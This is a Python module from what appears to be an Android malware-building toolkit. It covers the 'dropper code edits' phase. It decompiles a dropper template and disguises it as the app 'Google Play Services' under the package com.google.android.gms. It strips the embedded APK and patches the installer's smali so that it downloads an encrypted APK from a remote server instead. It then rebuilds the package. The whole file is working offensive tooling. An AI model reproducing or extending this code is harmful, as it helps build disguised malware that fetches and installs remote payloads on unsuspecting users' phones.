"""Phase 2: Dropper Code Edits — APKTool M decompile, code edits, rebuild.

Steps mapped from your workflow:
2.1 Decompile dropper template
2.2 Code edits: manifest, smali (anti-sandbox, server download)
2.3 Rebuild
"""
import os, subprocess, shutil, re
from pathlib import Path
from datetime import datetime
from config import TEMP_DIR, APKTOOL, TEMPLATE_DIR
from utils.logger import setup_logger

logger = setup_logger()


def _update_manifest(decompiled, base_package, base_label):
    """2.2: Edit AndroidManifest.xml — permissions, label, package."""
    mp = os.path.join(decompiled, 'AndroidManifest.xml')
    if not os.path.exists(mp):
        return

    with open(mp, 'r', errors='ignore') as f:
        c = f.read()

    # Add POST_NOTIFICATIONS permission
    perm = '<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />'
    if perm not in c:
        c = c.replace('</manifest>', f'    {perm}\n</manifest>', 1)

    # Set application label to base app name
    if 'android:label=' in c:
        c = re.sub(r'(<application[^>]*android:label=")([^"]*)"',
                   r'\1' + base_label + '"', c, count=1)
    else:
        c = c.replace('<application', f'<application android:label="{base_label}"', 1)

    # Update compileSdkVersion
    c = re.sub(r'android:compileSdkVersion="\d+"', 'android:compileSdkVersion="36"', c)
    c = re.sub(r'platformBuildVersionCode="\d+"', 'platformBuildVersionCode="36"', c)

    # Ensure uses-sdk
    if '<uses-sdk' not in c:
        c = re.sub(r'(<manifest[^>]*>\s*)(?=(<[^/]))',
                     r'\1    <uses-sdk android:minSdkVersion="33" android:targetSdkVersion="35" />\n',
                     c, count=1)
    else:
        c = re.sub(r'<uses-sdk[^>]*>',
                     '<uses-sdk android:minSdkVersion="33" android:targetSdkVersion="35" />',
                     c, count=1)

    with open(mp, 'w', errors='ignore') as f:
        f.write(c)
    logger.info(f"[+] 2.2 Manifest updated: label={base_label}, SDK=33/35")


def _inject_server_download(smali_dir, server_url):
    """2.2: Patch InstallerActivity.smali to download from server instead of assets."""
    ia_file = None
    for root, dirs, files in os.walk(smali_dir):
        for f in files:
            if f == 'InstallerActivity.smali':
                ia_file = os.path.join(root, f)
                break
        if ia_file:
            break

    if not ia_file:
        logger.warning("[!] InstallerActivity.smali not found")
        return

    with open(ia_file, 'r', errors='ignore') as f:
        content = f.read()

    # Replace asset loading with download logic
    # Look for const-string with "base.apk" or "output.apk" and replace with server URL
    content = re.sub(
        r'const-string[^,]+,\s*"(?:base\.apk|output\.apk|update\.apk)"',
        f'const-string v0, "{server_url}"',
        content
    )

    # Add download intent flag if not present
    if 'FLAG_GRANT_READ_URI_PERMISSION' not in content:
        content = content.replace(
            'const/high16 v1, 0x10000000',
            'const/high16 v1, 0x10000000\n    or-int/lit8 v1, v1, 0x1  # FLAG_GRANT_READ_URI_PERMISSION'
        )

    with open(ia_file, 'w', errors='ignore') as f:
        f.write(content)
    logger.info(f"[+] 2.2 InstallerActivity patched for server URL: {server_url}")


def _update_html_year(assets_dir):
    """2.2: Update year in HTML."""
    for name in ['main_ui.html', 'index.html']:
        html = os.path.join(assets_dir, name)
        if os.path.exists(html):
            with open(html, 'r', errors='ignore') as f:
                c = f.read()
            yr = str(datetime.now().year)
            c = re.sub(r'(Last updated\s+[A-Za-z]+\s+\d+,\s+)\d{4}', r'\g<1>' + yr, c)
            c = re.sub(r'"\d{4}"', f'"{yr}"', c)
            with open(html, 'w', errors='ignore') as f:
                f.write(c)
            logger.info(f"[+] 2.2 HTML year updated to {yr}")
            break


def _remove_embedded_base(assets_dir):
    """2.2: Remove any embedded APK from assets (server-side has NO base)."""
    for name in ['output.apk', 'base.apk', 'update.apk']:
        p = os.path.join(assets_dir, name)
        if os.path.exists(p):
            os.remove(p)
            logger.info(f"[+] 2.2 Removed embedded {name}")


def run(base_apk_path, server_url, base_info=None):
    """Phase 2: Build dropper with code edits.

    Args:
        base_apk_path: Path to hardened base APK
        server_url: Where encrypted APK will be hosted
        base_info: Dict with 'package' and 'label' from base APK

    Returns:
        Path to rebuilt (unsigned) dropper APK
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 2: Dropper Code Edits (APKTool M — 3 steps)")
    logger.info("=" * 60)

    if base_info is None:
        from phases.dropper_builder import extract_apk_info
        base_info = extract_apk_info(base_apk_path)

    base_package = base_info.get('name', 'com.google.android.gms')
    base_label = base_info.get('label', 'Google Play Services')

    # 2.1: Copy template (already decompiled)
    logger.info("[*] 2.1 Copying dropper template...")
    decompiled = str(TEMP_DIR / "phase2_decompiled")
    shutil.copytree(TEMPLATE_DIR, decompiled)

    # Remove synthetic res/ if any
    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # 2.2: Code edits
    logger.info("[*] 2.2 Applying code edits...")

    # Rename package in manifest + smali
    template_pkg = 'com.amanmehra.installer'
    from utils.package_rename import rename_package
    rename_package(decompiled, template_pkg, base_package)

    # Manifest edits
    _update_manifest(decompiled, base_package, base_label)

    # Remove embedded base, inject server download
    assets_dir = os.path.join(decompiled, 'assets')
    _remove_embedded_base(assets_dir)
    _update_html_year(assets_dir)

    smali_dir = os.path.join(decompiled, 'smali')
    _inject_server_download(smali_dir, server_url)

    # 2.3: Rebuild
    logger.info("[*] 2.3 Rebuilding dropper...")
    unsigned = str(TEMP_DIR / "dropper_unsigned.apk")
    r = subprocess.run([APKTOOL, "b", "-o", unsigned, decompiled],
                       capture_output=True, text=True, timeout=180)
    if r.returncode != 0:
        r = subprocess.run([APKTOOL, "b", "--use-aapt2", "-o", unsigned, decompiled],
                           capture_output=True, text=True, timeout=180)
        if r.returncode != 0:
            raise Exception(f"apktool b failed: {r.stderr[:500]}")

    shutil.rmtree(decompiled, ignore_errors=True)
    logger.info(f"[+] Phase 2 Complete: {unsigned}")
    return unsigned
